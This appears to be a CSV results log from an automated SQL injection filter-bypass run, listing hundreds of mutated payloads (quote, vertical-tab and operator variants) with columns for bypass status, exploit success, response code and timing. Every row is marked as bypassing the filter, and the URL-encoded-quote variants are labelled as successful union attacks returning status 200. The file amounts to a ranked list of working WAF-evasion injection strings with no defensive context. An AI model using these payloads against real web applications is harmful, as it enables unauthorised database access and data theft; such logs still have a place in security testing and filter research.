Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0297,69.07,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,69.77,No,200
0'or+1<@+||,Bypassed,No,None,Unknown,0.012,69.77,No,500
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0115,69.77,No,500
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0105,69.77,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0108,69.77,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0197,69.77,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0159,69.77,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0106,69.77,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0186,69.77,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0198,69.77,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0182,69.77,No,500
0'or+!@<@.%0bor,Bypassed,No,None,Unknown,0.0136,69.77,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0063,69.77,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0136,69.77,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0139,69.77,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0134,69.77,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0132,69.77,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0091,69.77,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0078,69.77,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0113,69.77,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0108,69.77,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0219,69.77,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,69.77,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0099,69.77,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0084,69.77,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.008,69.77,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0125,69.77,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0069,69.77,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0112,69.77,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,69.77,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0111,69.77,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0096,69.77,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0164,69.77,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0185,69.77,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.012,69.77,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0132,69.77,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0149,69.77,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0117,69.77,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0111,69.77,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0137,69.89,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0128,70.01,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0123,70.4,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0183,70.65,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.013,70.65,No,500
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0123,70.65,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0119,70.65,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0126,70.65,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0073,70.65,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0159,69.07,No,500
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0085,69.77,No,500
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0146,69.77,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,69.77,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0133,69.77,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0102,69.77,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0122,69.77,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0145,69.77,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0111,69.77,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0157,69.77,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.015,69.77,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0179,69.77,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0206,69.77,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0179,69.77,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0102,69.77,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0124,69.77,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0132,69.77,No,500
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0161,69.77,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0142,69.77,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0136,69.77,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0123,69.77,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,69.77,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0163,69.77,No,500
0'or+@<@.+||,Bypassed,No,None,Unknown,0.0127,69.77,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0161,69.77,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.01,69.77,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0134,69.77,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0119,69.77,No,200
0'||+@<@.+||,Bypassed,No,None,Unknown,0.0066,69.77,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0083,69.77,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0149,69.77,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0119,69.77,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0157,69.77,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0102,69.77,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0232,69.77,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0258,69.77,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0093,69.77,No,500
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0125,69.77,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0162,69.77,No,500
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0141,69.89,No,500
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0188,70.13,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0115,70.52,No,200
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0197,70.65,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,70.65,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0082,70.65,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0121,70.65,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0077,70.65,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0117,70.65,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0154,69.07,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0094,69.77,No,500
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.014,69.77,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0105,69.77,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0122,69.77,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0094,69.77,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0098,69.77,No,200
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0143,69.77,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,69.77,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0138,69.77,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0159,69.77,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0238,69.77,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0183,69.77,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0043,69.77,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0185,69.77,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0154,69.77,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.018,69.77,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.012,69.77,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0145,69.77,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.014,69.77,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0146,69.77,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0112,69.77,No,200
0%27or+@<@+||,Bypassed,Yes,unionAtk,Unknown,0.0148,69.77,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0127,69.77,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.017,69.77,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0122,69.77,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.019,69.77,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.016,69.77,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0126,69.77,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0116,69.77,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0136,69.77,No,200
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0143,69.77,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0123,69.77,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,69.77,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0167,69.77,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0168,69.77,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,69.77,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0105,69.77,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0111,69.77,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0184,69.89,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,70.01,No,200
0%27or+1<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0204,70.4,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0139,70.65,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0092,70.65,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0114,70.65,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0136,70.65,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0136,70.65,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0114,70.65,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0151,70.65,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0229,70.65,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0179,69.07,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0097,69.77,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0175,69.77,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0158,69.77,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0088,69.77,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.013,69.77,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0155,69.77,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,69.77,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0099,69.77,No,500
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0133,69.77,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0106,69.77,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,69.77,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0204,69.77,No,200
0%27||+@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0207,69.77,No,200
0'or%0b@<@.+||,Bypassed,No,None,Unknown,0.0178,69.77,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.018,69.77,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0176,69.77,No,200
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0104,69.77,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0112,69.77,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.013,69.77,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0116,69.77,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0087,69.77,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0131,69.77,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0103,69.77,No,200
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0109,69.77,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,69.77,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.014,69.77,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0089,69.77,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0118,69.77,No,500
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.01,69.77,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0128,69.77,No,500
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0131,69.77,No,500
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0088,69.77,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0138,69.77,No,500
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0109,69.77,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0076,69.77,No,200
0%27||+1<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0195,69.77,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.013,69.77,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0098,69.77,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0129,69.77,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0148,69.77,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0067,69.77,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0103,69.77,No,200
